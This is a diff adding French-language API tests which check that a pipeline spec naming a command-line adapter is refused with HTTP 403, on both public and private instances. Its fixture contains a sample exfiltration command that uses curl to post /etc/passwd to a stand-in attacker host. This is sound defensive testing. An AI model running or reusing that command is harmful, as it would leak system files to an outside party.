@@ -257,3 +257,66 @@ def test_a_brick_outside_the_role_is_refused(tmp_path: Path) -> None:
         },
     )
     assert reponse.status_code == 422
+
+
+# --------------------------------------------------------------------------- #
+# Le verrou « ligne de commande seulement »
+# --------------------------------------------------------------------------- #
+
+
+def _spec_avec_cli() -> str:
+    spec = yaml.safe_load(_spec_minimale())
+    spec["pipelines"][0]["steps"].insert(
+        0,
+        {
+            "id": "seg",
+            "kind": "segmentation",
+            "adapter_name": "cli_layout:evasion",
+            "input_types": ["image"],
+            "output_types": ["layout"],
+        },
+    )
+    spec["adapter_kwargs"]["cli_layout:evasion"] = {
+        "label": "evasion",
+        "command": "curl attaquant.example -d @/etc/passwd {image}",
+    }
+    return yaml.safe_dump(spec, allow_unicode=True)
+
+
+def test_une_spec_qui_nomme_une_brique_cli_est_refusee(tmp_path: Path) -> None:
+    """**Le second test le plus important du fichier.**
+
+    ``cli_layout`` exécute une commande écrite dans la spec. C'est sa raison
+    d'être en local, et ce serait un shell offert par HTTP. Le refus ne passe
+    donc pas par la disponibilité ni par le catalogue : il est premier.
+    """
+    client = _client(tmp_path)
+    corpus_id = _corpus(client)
+
+    reponse = client.post(
+        "/api/runs/spec",
+        headers=_CSRF,
+        json={"corpus_id": corpus_id, "spec": _spec_avec_cli()},
+    )
+
+    assert reponse.status_code == 403, reponse.json()
+    assert "ligne de commande" in reponse.json()["detail"]
+
+
+def test_le_refus_vaut_aussi_sur_une_instance_privee(tmp_path: Path) -> None:
+    """La règle porte sur ce que la brique **fait**, pas sur qui regarde.
+
+    « Instance privée » veut dire « les gens que je connais », pas « les gens à
+    qui je confie un shell ». Le mode public borne une *exposition* ; ce verrou
+    borne une *capacité*, et les deux ne se remplacent pas.
+    """
+    client = _client(tmp_path, public_mode=False)
+    corpus_id = _corpus(client)
+
+    reponse = client.post(
+        "/api/runs/spec",
+        headers=_CSRF,
+        json={"corpus_id": corpus_id, "spec": _spec_avec_cli()},
+    )
+
+    assert reponse.status_code == 403
